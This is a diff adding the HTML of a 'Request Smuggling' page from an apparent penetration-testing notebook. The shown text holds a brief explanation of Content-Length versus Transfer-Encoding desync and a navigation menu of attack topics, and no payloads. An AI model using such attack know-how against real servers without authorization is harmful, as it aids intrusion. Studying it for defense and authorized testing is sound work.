@@ -1,0 +1,3585 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+<head>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="See HTTP Common Sense for basics
+This attack is also called desynchronization attack
+Overview# Since web servers use Content-Length(CL) header or Transfer-Encoding(TE) header to separate each request, we might be able to create a discrepancy between front end server (reverse proxy, web cache, CDN) and back end server
+This is how Content-Length works. HTTP body have hello, which is exactly 5 bytes, so it is the value of the header
+POST / HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 5 helloThis is howTransfer-Encoding works. Each chunk is preceded by its size in hexadecimal format on a separate line (0xb = 11). The request is terminated by a chunk of size 0
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/">
+  <meta property="og:site_name" content="SpellBook">
+  <meta property="og:title" content="SpellBook">
+  <meta property="og:description" content="See HTTP Common Sense for basics
+This attack is also called desynchronization attack
+Overview# Since web servers use Content-Length(CL) header or Transfer-Encoding(TE) header to separate each request, we might be able to create a discrepancy between front end server (reverse proxy, web cache, CDN) and back end server
+This is how Content-Length works. HTTP body have hello, which is exactly 5 bytes, so it is the value of the header
+POST / HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 5 helloThis is howTransfer-Encoding works. Each chunk is preceded by its size in hexadecimal format on a separate line (0xb = 11). The request is terminated by a chunk of size 0">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="03.-enumeration">
+
+
+  <meta itemprop="name" content="SpellBook">
+  <meta itemprop="description" content="See HTTP Common Sense for basics
+This attack is also called desynchronization attack
+Overview# Since web servers use Content-Length(CL) header or Transfer-Encoding(TE) header to separate each request, we might be able to create a discrepancy between front end server (reverse proxy, web cache, CDN) and back end server
+This is how Content-Length works. HTTP body have hello, which is exactly 5 bytes, so it is the value of the header
+POST / HTTP/1.1 Host: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 5 helloThis is howTransfer-Encoding works. Each chunk is preceded by its size in hexadecimal format on a separate line (0xb = 11). The request is terminated by a chunk of size 0">
+  <meta itemprop="wordCount" content="2059">
+
+<title>Request Smuggling | SpellBook</title>
+<link rel="icon" href="/spellbook/favicon.png" >
+<link rel="manifest" href="/spellbook/manifest.json">
+<link rel="canonical" href="https://rusted-silver.github.io/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/">
+<link rel="stylesheet" href="/spellbook/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">
+
+
+  <script defer src="/spellbook/fuse.min.js"></script>
+  <script defer src="/spellbook/en.search.min.5ba98d1a9d6abff7b5da47d3a9a39a720a0e32df83c349f0e060f2b59a2c20ca.js" integrity="sha256-W6mNGp1qv/e12kfTqaOacgoOMt&#43;Dw0nw4GDytZosIMo=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-03.-enumeration">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/spellbook/"><span>SpellBook</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+<ul><li><a href="/spellbook/">&lt;- Back to main page</a></li></ul>
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="toggle"  />
+    <label for="section-3e8dfd6811139b26df71dcc7c1ec8a71" class="flex">
+      <a role="button" class="">
+        01. Passive Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/bug-bounty-dorks/" class="">
+      Bug Bounty Dorks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/dns/" class="">
+      DNS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/public-s3-buckets/" class="">
+      Public S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/source-code/" class="">
+      Source Code</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/01.-passive-recon/subdomain-enumeration/" class="">
+      Subdomain Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-620ac26c1d74d3712f5771bd92ea1cd1" class="toggle"  />
+    <label for="section-620ac26c1d74d3712f5771bd92ea1cd1" class="flex">
+      <a role="button" class="">
+        02. Active Recon</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/port-scan/" class="">
+      Port Scan</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/02.-active-recon/web---assets-enumeration/" class="">
+      Web Assets Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1eb6d1276e5402b7759fe597792fed3e" class="toggle" checked />
+    <label for="section-1eb6d1276e5402b7759fe597792fed3e" class="flex">
+      <a role="button" class="">
+        03. Enumeration</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="toggle" checked />
+    <label for="section-da1ecbb0229a70dd5366fa770cbcdbf8" class="flex">
+      <a role="button" class="">
+        80,443 Tcp HTTP</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6121218ae46d8375829819d014e3b5f5" class="toggle"  />
+    <label for="section-6121218ae46d8375829819d014e3b5f5" class="flex">
+      <a role="button" class="">
+        Common Vulnerability</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/basic-http-auth/" class="">
+      Basic HTTP Auth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/blind-sqli/" class="">
+      Blind SQL I</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/code-injection/" class="">
+      Code Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/csrf/" class="">
+      Csrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/file-upload/" class="">
+      File Upload</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/graphql/" class="">
+      Graph Ql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/idor/" class="">
+      ID Or</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/jwt/" class="">
+      JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/lfi/" class="">
+      Lfi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/oauth/" class="">
+      Oauth</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/pdf-generation-injection/" class="">
+      Pdf Generation Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/saml/" class="">
+      Saml</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/sql-injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/ssrf/" class="">
+      Ssrf</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/template-injection-ssti/" class="">
+      Template Injection ( Ssti)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/websocket/" class="">
+      Websocket</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xss/" class="">
+      Xss</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/common-vulnerability/xxe/" class="">
+      Xxe</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-063b6da821fbfa4b9fcb65163a5b31d8" class="toggle" checked />
+    <label for="section-063b6da821fbfa4b9fcb65163a5b31d8" class="flex">
+      <a role="button" class="">
+        Rare Vulnerabilities</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/cache-poisoning/" class="">
+      Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/crlf-injection/" class="">
+      Crlf Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/hosts-header-attacks/" class="">
+      Hosts Header Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ldap-injection/" class="">
+      Ldap Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/mongodb-injection/" class="">
+      Mongodb Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/padding-oracles/" class="">
+      Padding Oracles</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/request-smuggling/" class="active">
+      Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/session-puzzling/" class="">
+      Session Puzzling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/ssi-injection/" class="">
+      Ssi Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/tls-ssl-attacks/" class="">
+      Tls ( Ssl) Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xpath-injection/" class="">
+      Xpath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/rare-vulnerabilities/xslt-injection/" class="">
+      Xslt Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2e09e512163cdc60fcb006584b888a87" class="toggle"  />
+    <label for="section-2e09e512163cdc60fcb006584b888a87" class="flex">
+      <a role="button" class="">
+        Webapps Specific</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/drupal/" class="">
+      Drupal</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/gitlab/" class="">
+      Git Lab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/jenkins/" class="">
+      Jenkins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/joomla/" class="">
+      Joomla</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/nexus-repository-manager/" class="">
+      Nexus Repository Manager</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/prtg/" class="">
+      Prtg</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/splunk/" class="">
+      Splunk</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/tomcat/" class="">
+      Tomcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webapps-specific/wordpress/" class="">
+      Word Press</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5de4a0e2a064acde43bb919dbfcee93b" class="toggle"  />
+    <label for="section-5de4a0e2a064acde43bb919dbfcee93b" class="flex">
+      <a role="button" class="">
+        Whitebox</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="toggle"  />
+    <label for="section-c6aacb94aa4d41ce7a7f6743146af7cc" class="flex">
+      <a role="button" class="">
+        Deserialization</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/asp.net/" class="">
+      Asp. Net</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/introduction/" class="">
+      Introduction</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/php/" class="">
+      Php</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/python/" class="">
+      Python</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/decompilation-tools/" class="">
+      Decompilation Tools</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/iis-installation/" class="">
+      Iis Installation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/prototype-pollution/" class="">
+      Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/type-juggling/" class="">
+      Type Juggling</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/http-common-sense/" class="">
+      HTTP Common Sense</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/https-exfiltration-server/" class="">
+      HTTP S Exfiltration Server</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/scripts/" class="">
+      Scripts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/80443-tcp-http/webshells/" class="">
+      Webshells</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/110995-tcp---pop3/" class="">
+      110,995 Tcp POP3</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1151-tcp---oracle-db/" class="">
+      1151 Tcp Oracle Db</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/143993-tcp---imap/" class="">
+      143,993 Tcp IMAP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1433-tcp---mssql/" class="">
+      1433 Tcp Mssql</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/1611621016110162-udp---snmp/" class="">
+      161,162,10161,10162 UDP SNMP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/2049-tcp---nfs/" class="">
+      2049 Tcp Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/21-tcp---ftp/" class="">
+      21 Tcp FTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/25465587-tcp---smtp/" class="">
+      25,465,587 Tcp SMTP</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/27017-tcp---mongodb/" class="">
+      27017 Tcp Mongodb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/3306-tcp---mysql/" class="">
+      3306 Tcp My SQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/4222-tcp---nats/" class="">
+      4222 Tcp NAT S</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/445-tcp---smb/" class="">
+      445 Tcp Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/623-udp---ipmi/" class="">
+      623 UDP IP Mi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/873-tcp---rsync/" class="">
+      873 Tcp Rsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/default-credentials/" class="">
+      Default Credentials</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/03.-enumeration/r-services/" class="">
+      R Services</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c69393f67cd7496c728f5b58e6ac1ee" class="toggle"  />
+    <label for="section-2c69393f67cd7496c728f5b58e6ac1ee" class="flex">
+      <a role="button" class="">
+        04. Initial Access</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/smb/" class="">
+      Smb</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/timeroasting/" class="">
+      Timeroasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/04.-initial-access/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-90c5584e370531caff111fc923627531" class="toggle"  />
+    <label for="section-90c5584e370531caff111fc923627531" class="flex">
+      <a role="button" class="">
+        05. Defense Evasion</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/applocker/" class="">
+      Applocker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/defender/" class="">
+      Defender</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/firewall/" class="">
+      Firewall</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/05.-defense-evasion/restriced-shell/" class="">
+      Restriced Shell</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07e5596a0ace078f0cf9976d44537c29" class="toggle"  />
+    <label for="section-07e5596a0ace078f0cf9976d44537c29" class="flex">
+      <a role="button" class="">
+        06. Privilege Escalation</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-085f8e8a106aad5123071eb91320ad16" class="toggle"  />
+    <label for="section-085f8e8a106aad5123071eb91320ad16" class="flex">
+      <a role="button" class="">
+        Linux</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="toggle"  />
+    <label for="section-2ea21e955d87b2e3ef58a7e330eeac1f" class="flex">
+      <a role="button" class="">
+        Cve</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/dirty-pipe/" class="">
+      Dirty Pipe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/logrotate/" class="">
+      Logrotate</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/netfilter/" class="">
+      Netfilter</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/cve/sudo-cve/" class="">
+      Sudo Cve</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ed5af43f9c413fcde5c865f6213099b9" class="toggle"  />
+    <label for="section-ed5af43f9c413fcde5c865f6213099b9" class="flex">
+      <a role="button" class="">
+        Privileged Groups</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/adm/" class="">
+      Adm</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/docker/" class="">
+      Docker</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/privileged-groups/lxc/" class="">
+      Lxc</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/credential-search/" class="">
+      Credential Search</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/crontab/" class="">
+      Crontab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/kubernetes/" class="">
+      Kubernetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/nfs/" class="">
+      Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/path-injection/" class="">
+      Path Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/python-library-hijack/" class="">
+      Python Library Hijack</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/sudo/" class="">
+      Sudo</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="toggle"  />
+    <label for="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="flex">
+      <a role="button" class="">
+        Windows</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-30c877d7e6dbf04e89232795939c9472" class="toggle"  />
+    <label for="section-30c877d7e6dbf04e89232795939c9472" class="flex">
+      <a role="button" class="">
+        Special Privileges</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
